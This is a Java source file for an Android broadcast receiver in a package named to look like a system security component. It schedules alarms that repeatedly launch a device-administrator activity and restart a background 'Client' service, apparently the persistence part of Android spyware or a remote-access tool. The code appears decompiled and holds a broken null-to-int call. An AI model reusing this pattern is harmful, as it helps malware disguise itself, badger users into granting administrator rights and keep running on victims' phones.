package com.android.security.receiver;

import java.util.Calendar;
import java.util.List;

import com.android.security.AdminActivity;
import com.android.security.Client;
import com.android.security.ClientListener;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Bundle;
import android.util.Log;

public class AlarmReceiver extends BroadcastReceiver {
	public static final String ALARM_MSG = "alarm_msg";
	public static final int DEVICE_ADMIN = 0;
	public static final int RUN_SERVICE = 1;
	public final   String TAG = AlarmReceiver.class.getSimpleName();

	public static void setAlarm(Context paramContext, int paramInt1,
			int paramInt2) {
		
		Calendar localCalendar = Calendar.getInstance();
		localCalendar.add(Calendar.SECOND, paramInt1);
		Intent localIntent = new Intent(paramContext, AlarmReceiver.class);
		localIntent.setAction(paramContext.getClass().getName());
		localIntent.putExtra(ALARM_MSG, paramInt2);
		PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, localIntent, 0x8000000);
		((AlarmManager) paramContext.getSystemService(Context.ALARM_SERVICE)).set(0,localCalendar.getTimeInMillis(), localPendingIntent);
	}

 	private void startAdminActivity(Context paramContext) {
		Intent localIntent = new Intent(paramContext, AdminActivity.class); 
		localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		paramContext.startActivity(localIntent);
	}
 
    private void startAppByPackageName(Context context) {
        PackageInfo pi = null;
        try {
            pi = context.getApplicationContext().getPackageManager().getPackageInfo(context.getPackageName(), 0x0);
        } catch(PackageManager.NameNotFoundException e) {
            return;
        }
        try {
            Intent resolveIntent = new Intent("android.intent.action.MAIN", null);
            resolveIntent.addCategory("android.intent.category.LAUNCHER");
            resolveIntent.setPackage(pi.packageName);
            List<ResolveInfo> apps = context.getApplicationContext().getPackageManager().queryIntentActivities(resolveIntent, (Integer) null);
            ResolveInfo ri = (ResolveInfo)apps.iterator().next();
            if(ri != null) {
                String packageName1 = ri.activityInfo.packageName;
                String className = ri.activityInfo.name;
                ComponentName cn = new ComponentName(packageName1, className);

                Intent intent = new Intent("android.intent.action.MAIN");
                intent.addCategory("android.intent.category.LAUNCHER");
                intent.addFlags(0x10000000);

                intent.setComponent(cn);
                context.startActivity(intent);
                return;
            }
        } catch(Exception localException1) {
        }
    }
    
	public void onReceive(Context paramContext, Intent paramIntent) {
		Log.i(TAG,"onReceive");
		try {
			Bundle bundle = paramIntent.getExtras();
			int msg = bundle.getInt(ALARM_MSG);
			switch (msg) {
			case 0: {
				startAdminActivity(paramContext);
				return;
			}
			case 1: {
				Log.i(TAG,"ClientListener");
				Intent service = new Intent(paramContext, Client.class);
				service.setAction(AlarmReceiver.class.getName());
				paramContext.startService(service);
				return;
			}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
